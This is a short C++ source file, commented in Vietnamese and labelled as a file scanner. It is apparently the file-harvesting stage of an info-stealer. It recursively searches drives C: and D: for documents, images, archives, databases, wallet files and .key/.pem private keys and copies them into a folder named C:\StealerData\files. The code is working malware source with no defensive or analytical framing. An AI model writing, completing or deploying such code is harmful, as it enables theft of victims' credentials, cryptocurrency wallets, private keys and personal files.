// ============================================================
// scanner.cpp - C++ File Scanner
// Compile: cl /O2 /MT /EHsc scanner.cpp /Fe:scanner.exe
// ============================================================

#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <filesystem>

namespace fs = std::filesystem;

// Các extension cần thu thập
const std::vector<std::wstring> EXTS = {
    L".pdf", L".doc", L".docx", L".xls", L".xlsx",
    L".txt", L".jpg", L".png", L".mp4", L".zip",
    L".rar", L".db", L".wallet", L".key", L".pem"
};

void ScanDirectory(const std::wstring& path) {
    try {
        for (const auto& entry : fs::recursive_directory_iterator(path)) {
            if (fs::is_regular_file(entry.path())) {
                auto ext = entry.path().extension().wstring();
                for (const auto& target : EXTS) {
                    if (_wcsicmp(ext.c_str(), target.c_str()) == 0) {
                        std::wstring dest = L"C:\\StealerData\\files\\" + entry.path().filename().wstring();
                        CopyFileW(entry.path().c_str(), dest.c_str(), FALSE);
                        break;
                    }
                }
            }
        }
    } catch (...) {}
}

int main() {
    // Tạo thư mục output
    CreateDirectoryW(L"C:\\StealerData\\files", NULL);
    
    // Quét ổ C:
    ScanDirectory(L"C:\\");
    
    // Quét ổ D: nếu có
    if (GetFileAttributesW(L"D:\\") != INVALID_FILE_ATTRIBUTES) {
        ScanDirectory(L"D:\\");
    }
    
    return 0;
}